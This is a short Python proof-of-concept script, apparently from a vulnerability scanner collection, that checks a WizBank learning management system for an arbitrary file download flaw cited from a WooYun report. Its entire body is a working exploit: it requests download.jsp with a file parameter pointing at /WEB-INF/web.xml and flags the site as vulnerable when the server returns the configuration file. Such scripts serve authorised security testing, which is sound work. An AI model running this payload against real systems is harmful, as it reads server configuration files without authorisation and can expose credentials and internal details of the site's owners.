#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 汇思学习管理系统任意文件下载
referer: http://www.wooyun.org/bugs/wooyun-2010-0149619
author: Lucifer
description: \www\cw\skin1\jsp\download.jsp源码中,未经过文件类型检查和过滤，直接下载文件
'''
import sys
import requests
import warnings
from termcolor import cprint

class wizbank_download_filedownload_BaseVerify():
    def __init__(self, url):
        self.url = url

    def run(self):
        payload = "/cw/skin1/jsp/download.jsp?file=/WEB-INF/web.xml"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, timeout=10, verify=False)

            if req.headers["Content-Type"] == "application/xml":
                cprint("[+]存在wizbank学习管理系统任意文件下载漏洞...(高危)\tpayload: "+vulnurl, "red")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = wizbank_download_filedownload_BaseVerify(sys.argv[1])
    testVuln.run()